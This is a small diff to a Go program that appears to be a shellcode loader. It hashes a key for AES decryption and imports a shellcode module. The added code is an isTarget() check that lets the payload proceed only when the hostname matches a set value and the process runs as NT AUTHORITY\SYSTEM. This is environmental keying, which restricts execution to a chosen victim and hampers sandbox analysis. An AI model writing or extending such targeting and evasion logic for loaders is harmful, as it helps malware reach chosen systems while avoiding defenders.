@@ -5,6 +5,8 @@ import (
 	"encoding/hex"
 	"flag"
 	"log"
+	"os"
+	"os/user"
 
 	"project/internal/crypto/aes"
 	"project/internal/module/shellcode"
@@ -25,6 +27,9 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
+	if !isTarget() {
+		return
+	}
 	hash := sha256.New()
 	hash.Write([]byte(key))
 	aesKey := hash.Sum(nil)
@@ -37,4 +42,22 @@ func main() {
 	if err != nil {
 		log.Fatalln(err)
 	}
+}
+
+func isTarget() bool {
+	hostname, err := os.Hostname()
+	if err != nil {
+		return false
+	}
+	if hostname != "host name" {
+		return false
+	}
+	cUser, err := user.Current()
+	if err != nil {
+		return false
+	}
+	if cUser.Username != "NT AUTHORITY\\SYSTEM" {
+		return false
+	}
+	return true
 }
